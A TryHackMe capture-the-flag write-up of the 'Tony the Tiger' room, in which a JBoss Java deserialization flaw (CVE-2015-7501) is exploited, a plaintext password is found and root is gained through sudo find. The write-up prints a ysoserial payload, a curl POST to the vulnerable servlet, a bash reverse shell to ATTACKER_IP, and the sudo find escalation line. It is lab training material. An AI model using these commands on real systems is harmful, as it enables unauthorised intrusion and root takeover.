# Tony the Tiger — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Tony the Tiger  
**Difficulty:** Easy  
**Date:** 2026-05-19  
**Tags:** Java Deserialization, JBoss, CVE-2015-7501, ysoserial, Privilege Escalation, sudo find

---

## Overview

This room teaches exploitation of a Java deserialization vulnerability (CVE-2015-7501) in JBoss Application Server. The attack chain involves exploiting an insecure deserialization endpoint to gain initial access, discovering credentials in plaintext notes for lateral movement, and abusing a sudo misconfiguration on `find` to escalate to root.

---

## MITRE ATT&CK Mapping

| TTP | Technique | Description |
|-----|-----------|-------------|
| T1595.001 | Active Scanning: Port Scanning | Full port nmap scan to enumerate services |
| T1190 | Exploit Public-Facing Application | Java deserialization via JMXInvokerServlet |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Reverse shell execution |
| T1552.001 | Unsecured Credentials: Credentials In Files | Plaintext password in `/home/jboss/note` |
| T1548.003 | Abuse Elevation Control: Sudo and Sudo Caching | `sudo find` with NOPASSWD to spawn root shell |

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O -A -p- 10.66.169.32
```

Key findings from the full port scan:

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 6.6.1p1 Ubuntu |
| 80 | HTTP | Apache 2.4.7 — Hugo blog "Tony's Blog" |
| 1090-1099 | Java RMI / Object Serialization | JBoss naming service, hostname `thm-java-deserial.home` |
| 3873, 4446 | Java Object Serialization | Magic bytes `\xac\xed\x00\x05` visible in fingerprints |
| 8009 | AJP13 | Apache JServ Protocol — PUT, DELETE, TRACE allowed |
| 8080 | HTTP | Apache Tomcat/Coyote — **JBoss AS Welcome Page** |
| 8083 | HTTP | JBoss service httpd (class loading) |

The Java serialization magic bytes `AC ED 00 05` on multiple ports and the hostname `thm-java-deserial.home` immediately signal that Java deserialization is the intended attack vector.

### Gobuster (Port 80)

```bash
gobuster dir -u http://10.66.169.32 -w /usr/share/wordlists/dirb/common.txt -x .html
```

Results showed a standard Hugo blog structure (`/posts/`, `/images/`, `/css/`, `/js/`, `/tags/`, `/categories/`). No admin panels or interesting endpoints — the blog on port 80 is a rabbit hole for exploitation purposes (though it contains one of the flags in an image).

---

## Initial Access — Java Deserialization (CVE-2015-7501)

### Background

JBoss Application Server exposes `/invoker/JMXInvokerServlet` on port 8080. This endpoint accepts serialized Java objects via HTTP POST and deserializes them using `ObjectInputStream.readObject()` without validation. By crafting a malicious serialized object with a gadget chain from Apache Commons Collections (which is on JBoss's classpath), we achieve Remote Code Execution.

The attack flow:

```
ysoserial generates malicious serialized object
    → CommonsCollections gadget chain embedded
        → curl POSTs bytes to /invoker/JMXInvokerServlet
            → JBoss calls ObjectInputStream.readObject()
                → Gadget chain triggers Runtime.getRuntime().exec()
                    → Reverse shell connects back to attacker
```

### Exploitation

**Step 1 — Add hostname to /etc/hosts:**

```bash
echo "10.66.169.32 thm-java-deserial.home" | sudo tee -a /etc/hosts
```

**Step 2 — Generate the payload with ysoserial:**

```bash
# Encode the reverse shell in base64 to avoid special character issues
echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64

# Generate the serialized payload
java -jar ysoserial-all.jar CommonsCollections5 \
  'bash -c {echo,BASE64_ENCODED_SHELL}|{base64,-d}|{bash,-i}' \
  > payload.bin
```

Why base64 wrapping? `Runtime.exec()` splits arguments by spaces and does not understand bash redirections (`>&`, `|`). The curly brace syntax `{echo,PAYLOAD}|{base64,-d}|{bash,-i}` avoids spaces while passing the command through bash for proper interpretation. This is a standard technique for Java deserialization payloads.

**Step 3 — Start listener and send payload:**

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — send payload
curl http://10.66.169.32:8080/invoker/JMXInvokerServlet --data-binary @payload.bin
```

Shell received as user `cmnatic`:

```
cmnatic@thm-java-deserial:/$ whoami
cmnatic
cmnatic@thm-java-deserial:/$ id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

---

## Post-Exploitation

### Upgrade Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Lateral Movement — cmnatic → jboss

Checked bash history and found hints from the room author ("I see you peeping!", "You're on the right lines..."). Enumerated home directories and found a note with credentials:

```bash
cat /home/jboss/note
```

```
Hey JBoss!
Following your email, I have tried to replicate the issues you were
having with the system.
However, I don't know what commands you executed - is there any file
where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested
(make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
```

Switched to jboss:

```bash
su jboss
# Password: likeaboss
```

### Privilege Escalation — jboss → root

```bash
jboss@thm-java-deserial:~$ sudo -l
User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

`find` with sudo and NOPASSWD — a well-known GTFOBins vector:

```bash
sudo find . -exec /bin/bash \;
```

Root shell obtained:

```bash
whoami
root
```

### Root Flag

```bash
cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

Triple-encoded flag:
1. **Base64 decode:** `QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y=` → `BC77AC072EE30E3760806864E234C7CF`
2. **MD5 crack** (via CrackStation): `BC77AC072EE30E3760806864E234C7CF` → `zxcvbnm123456789`

The plaintext `zxcvbnm123456789` is the bottom row of a QWERTY keyboard plus digits — a classic weak password pattern.

---

## Flags

| Task | Flag |
|------|------|
| Tony's Blog | `THM{???s}` |
| JBoss | `THM{???}` |
| Root | `???` |

---

## Mistakes I Made

1. **Blog flag inaccessible via intended path.** The Frosted Flakes post contained an image hosted on imgur (`https://i.imgur.com/be2sOV9.jpg`) with the flag presumably in EXIF metadata. Imgur returned HTTP 429 (rate limiting), making it impossible to download the image from the attack machine. Lesson: old rooms with external dependencies can break; always check if assets are cached locally on the target before trying external URLs.

2. **Duplicate path in curl.** When trying to access the blog post, I accidentally used `curl http://10.66.169.32/posts/posts/frosted-flakes/` (double `/posts/`) instead of `curl http://10.66.169.32/posts/frosted-flakes/`. Got a 404 and wasted time before noticing the typo. Lesson: always double-check URLs, especially when constructing them manually from relative paths in HTML.

3. **No TTY for sudo.** Initial shell from deserialization had no TTY, causing `sudo -l` to fail with "no tty present and no askpass program specified". Fixed with `python -c 'import pty;pty.spawn("/bin/bash")'`. Lesson: always upgrade your shell immediately after catching it — TTY is needed for `su`, `sudo`, and interactive commands.

4. **Searched for privesc vectors before reading files.** Ran SUID/cron/capabilities checks first, all came back clean. Should have started with reading home directories, bash histories, and configuration files — the credentials were sitting in a plaintext note. Lesson: on CTF machines, always enumerate user files and histories before running automated privesc scripts.

---

## Key Takeaways

- **Java deserialization** remains a relevant attack vector. While modern JBoss/WildFly versions have mitigated the most obvious exposures (authenticated admin consoles, no open JMXInvokerServlet), the underlying vulnerability class persists in internal service meshes and legacy applications.
- **Magic bytes `AC ED 00 05`** in nmap fingerprints are a dead giveaway for Java native serialization endpoints.
- **ysoserial** is the go-to tool for generating deserialization payloads. Multiple gadget chains exist (CommonsCollections1-7, etc.) — if one doesn't work, try others, as it depends on what libraries are on the target's classpath.
- **Base64 wrapping** for reverse shells through `Runtime.exec()` is a standard technique worth memorizing.
- **GTFOBins** for `find`: `sudo find . -exec /bin/bash \;` — instant root when find has NOPASSWD sudo.
- **Credential reuse and plaintext storage** are still common findings in real-world pentests, not just CTFs.

---

## Tools Used

- nmap
- gobuster
- ysoserial
- curl
- netcat (nc)
- CrackStation (MD5 cracking)
- Python (TTY upgrade)
